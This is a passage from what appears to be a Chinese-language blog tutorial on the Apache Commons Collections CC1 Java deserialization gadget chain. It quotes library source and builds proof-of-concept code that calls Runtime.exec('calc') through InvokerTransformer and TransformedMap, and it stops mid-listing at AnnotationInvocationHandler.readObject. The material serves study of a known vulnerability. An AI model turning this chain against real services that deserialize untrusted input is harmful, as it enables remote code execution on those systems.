class="hljs-doctag">@param</span> input  the input object which is ignored</span><br><span class="hljs-comment">    * <span class="hljs-doctag">@return</span> the stored constant</span><br><span class="hljs-comment">    */</span><br>   <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>       <span class="hljs-keyword">return</span> iConstant;<br>   &#125;<br><br>   <span class="hljs-comment">/**</span><br><span class="hljs-comment">    * Gets the constant.</span><br><span class="hljs-comment">    * </span><br><span class="hljs-comment">    * <span class="hljs-doctag">@return</span> the constant</span><br><span class="hljs-comment">    * <span class="hljs-doctag">@since</span> Commons Collections 3.1</span><br><span class="hljs-comment">    */</span><br>   <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getConstant</span><span class="hljs-params">()</span> &#123;<br>       <span class="hljs-keyword">return</span> iConstant;<br>   &#125;<br><br></code></pre></td></tr></table></figure><p>就是<span data-type="text" style="background-color: var(--b3-card-warning-background); color: var(--b3-card-warning-color);">接收一个参数，返回一个常量，即无论输入什么都返回固定的值</span></p><p>ChainedTransformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChainedTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Transformer</span>, Serializable &#123;<br><br>    <span class="hljs-comment">/** Serial version UID */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">3514945074733160196L</span>;<br><br>    <span class="hljs-comment">/** The transformers to call in turn */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Transformer[] iTransformers;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Factory method that performs validation and copies the parameter array.</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> transformers  the transformers to chain, copied, no nulls</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> the &lt;code&gt;chained&lt;/code&gt; transformer</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException if the transformers array is null</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException if any transformer in the array is null</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Transformer <span class="hljs-title function_">getInstance</span><span class="hljs-params">(Transformer[] transformers)</span> &#123;<br>        FunctorUtils.validate(transformers);<br>        <span class="hljs-keyword">if</span> (transformers.length == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> NOPTransformer.INSTANCE;<br>        &#125;<br>        transformers = FunctorUtils.copy(transformers);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>    &#125;<br>    <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Create a new Transformer that calls each transformer in turn, passing the </span><br><span class="hljs-comment">     * result into the next transformer. The ordering is that of the iterator()</span><br><span class="hljs-comment">     * method on the collection.</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> transformers  a collection of transformers to chain</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> the &lt;code&gt;chained&lt;/code&gt; transformer</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException if the transformers collection is null</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException if any transformer in the collection is null</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Transformer <span class="hljs-title function_">getInstance</span><span class="hljs-params">(Collection transformers)</span> &#123;<br>        <span class="hljs-keyword">if</span> (transformers == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Transformer collection must not be null&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (transformers.size() == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> NOPTransformer.INSTANCE;<br>        &#125;<br>        <span class="hljs-comment">// convert to array like this to guarantee iterator() ordering</span><br>        Transformer[] cmds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[transformers.size()];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">Iterator</span> <span class="hljs-variable">it</span> <span class="hljs-operator">=</span> transformers.iterator(); it.hasNext();) &#123;<br>            cmds[i++] = (Transformer) it.next();<br>        &#125;<br>        FunctorUtils.validate(cmds);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(cmds);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Factory method that performs validation.</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> transformer1  the first transformer, not null</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> transformer2  the second transformer, not null</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> the &lt;code&gt;chained&lt;/code&gt; transformer</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException if either transformer is null</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Transformer <span class="hljs-title function_">getInstance</span><span class="hljs-params">(Transformer transformer1, Transformer transformer2)</span> &#123;<br>        <span class="hljs-keyword">if</span> (transformer1 == <span class="hljs-literal">null</span> || transformer2 == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Transformers must not be null&quot;</span>);<br>        &#125;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123; transformer1, transformer2 &#125;;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Constructor that performs no validation.</span><br><span class="hljs-comment">     * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that.</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> transformers  the transformers to chain, not copied, no nulls</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ChainedTransformer</span><span class="hljs-params">(Transformer[] transformers)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        iTransformers = transformers;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Transforms the input to result via each decorated transformer</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> object  the input object passed to the first transformer</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> the transformed result</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object object)</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; iTransformers.length; i++) &#123;<br>            object = iTransformers[i].transform(object);<br>        &#125;<br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Gets the transformers, do not modify the array.</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> the transformers</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@since</span> Commons Collections 3.1</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> Transformer[] getTransformers() &#123;<br>        <span class="hljs-keyword">return</span> iTransformers;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>一言以蔽之，<span data-type="text" style="background-color: var(--b3-card-warning-background); color: var(--b3-card-warning-color);">前一个的输出作为后一个的输入，递归调用</span></p><p>以此类推将所有实现Transformer接口的都看一遍，发现了可利用的：</p><p><strong>InvokeTransformer</strong></p><p>关键代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>       <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">null</span>) &#123;<br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>       &#125;<br>       <span class="hljs-keyword">try</span> &#123;<br>           <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> input.getClass();<br>           <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> cls.getMethod(iMethodName, iParamTypes);<br>           <span class="hljs-keyword">return</span> method.invoke(input, iArgs);<br>               <br>       &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException ex) &#123;<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; does not exist&quot;</span>);<br>       &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException ex) &#123;<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; cannot be accessed&quot;</span>);<br>       &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException ex) &#123;<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; threw an exception&quot;</span>, ex);<br>       &#125;<br></code></pre></td></tr></table></figure><p>这里接收一个对象，然后反射调用，方法值、参数类型、参数都是我们可以控制的，也就是任意方法调用</p><p>然后我们可以利用这个方法来弹一个计算器</p><p>先正常弹一个计算器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><span class="hljs-comment">//        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Runtime.class;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">execMethod</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;exec&quot;</span>,String.class);<br>        execMethod.invoke(r,<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250802181406-dkgk461.png" alt="image"></p><p>再看一下InvokerTransformer需要传入哪些参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">InvokerTransformer</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        iMethodName = methodName;<br>        iParamTypes = paramTypes;<br>        iArgs = args;<br>    &#125;<br></code></pre></td></tr></table></figure><p>成功弹出计算器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><span class="hljs-comment">//        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br><span class="hljs-comment">//        Class c = Runtime.class;</span><br><span class="hljs-comment">//        Method execMethod = c.getMethod(&quot;exec&quot;,String.class);</span><br><span class="hljs-comment">//        execMethod.invoke(r,&quot;calc&quot;);</span><br><br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(r);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250802185550-h77km4k.png" alt="image"></p><h2 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h2><p>然后我们跟进<code>transform</code>​，右键点击FindUsages</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250802191621-7h6qesq.png" alt="image"></p><p>这里要注意红框里要有Libraries，如果没有，按ctrl+alt+F7，点击工具选择如下</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250802191749-ctpj4ny.png" alt="image"></p><h3 id="TransformedMap-checkSetValue"><a href="#TransformedMap-checkSetValue" class="headerlink" title="TransformedMap.checkSetValue("></a>TransformedMap.checkSetValue(</h3><p>最后发现TransformedMap类的 checkSetValue() 里使用了 valueTransformer调用transform()</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250802211952-7wolqzq.png" alt="image"></p><p>而这个 valueTransformer参数是否可控呢？ 是什么类型呢？</p><p>我们跟进查看一下 TransformedMap类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-title function_">TransformedMap</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>       <span class="hljs-built_in">super</span>(map);<br>       <span class="hljs-built_in">this</span>.keyTransformer = keyTransformer;<br>       <span class="hljs-built_in">this</span>.valueTransformer = valueTransformer;<br>   &#125;<br></code></pre></td></tr></table></figure><p>接收一个map进来，然后对它的key和value进行一些操作，然后要看一下在哪里调用的</p><h3 id="TransformedMap-decorate"><a href="#TransformedMap-decorate" class="headerlink" title="TransformedMap.decorate"></a>TransformedMap.decorate</h3><p>往上翻发现了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>       <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);<br>   &#125;<br></code></pre></td></tr></table></figure><p>这里就完成了刚才的装饰的操作</p><p>那么我们就可以从这里试一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><span class="hljs-comment">//        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br><span class="hljs-comment">//        Class c = Runtime.class;</span><br><span class="hljs-comment">//        Method execMethod = c.getMethod(&quot;exec&quot;,String.class);</span><br><span class="hljs-comment">//        execMethod.invoke(r,&quot;calc&quot;);</span><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        <span class="hljs-comment">//invokerTransformer.transform(r)</span><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        TransformedMap.decorate(map,<span class="hljs-literal">null</span>,invokerTransformer);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>所以就要看value是否可控</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">checkSetValue</span><span class="hljs-params">(Object value)</span> &#123;<br>       <span class="hljs-keyword">return</span> valueTransformer.transform(value);<br>   &#125;<br></code></pre></td></tr></table></figure><h2 id="反序列化入口点"><a href="#反序列化入口点" class="headerlink" title="反序列化入口点"></a>反序列化入口点</h2><h3 id="AbstractInputCheckedMapDecorator-MapEntr-setValue"><a href="#AbstractInputCheckedMapDecorator-MapEntr-setValue" class="headerlink" title="AbstractInputCheckedMapDecorator.MapEntr.setValue"></a>AbstractInputCheckedMapDecorator.MapEntr.setValue</h3><p>继续找入口点，去触发checkSetValue</p><p>跟进查看 发现只有 父类 AbstractInputCheckedMapDecorator抽象类里的 MapEntry 的setValue() 调用了checkSetValue()</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250802214811-1fhijaq.png" alt="image"></p><p>正常来讲我们只要遍历被修饰过的Map，就会走到setValue方法，就会调用checkSetValue()，然后就会到我们想要执行的transform(value)</p><p>因此我们可以再次构造一个链子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><span class="hljs-comment">//        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br><span class="hljs-comment">//        Class c = Runtime.class;</span><br><span class="hljs-comment">//        Method execMethod = c.getMethod(&quot;exec&quot;,String.class);</span><br><span class="hljs-comment">//        execMethod.invoke(r,&quot;calc&quot;);</span><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        <span class="hljs-comment">//invokerTransformer.transform(r)</span><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;key&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="hljs-literal">null</span>,invokerTransformer);<br>        <br>        <span class="hljs-keyword">for</span> (Map.Entry entry:transformedMap.entrySet())&#123;<br>            entry.setValue(r);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250802220450-gs0rfkb.png" alt="image"></p><p>接着要跟进setValue，找一下是谁的<code>readObject</code>​调用了setValue</p><h3 id="AnnotationInvocationHandler-readObject"><a href="#AnnotationInvocationHandler-readObject" class="headerlink" title="AnnotationInvocationHandler.readObject"></a>AnnotationInvocationHandler.readObject</h3><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250802220954-f90qk9h.png" alt="image"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>        s.defaultReadObject();<br><br>        <span class="hljs-comment">// Check to make sure that types have not evolved incompatibly</span><br><br>        <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">annotationType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            annotationType = AnnotationType.getInstance(type);<br>        &#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;<br>            <span class="hljs-comment">// Class is no longer an annotation type; time to punch out</span><br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>        &#125;<br><br>        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br><br>        <span class="hljs-comment">// If there are annotation members without values, that</span><br>        <span class="hljs-comment">// situation is handled by the invoke method.</span><br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>            Class&lt;?&gt; memberType = memberTypes.get(name);<br>            <span class="hljs-keyword">if</span> (memberType != <span 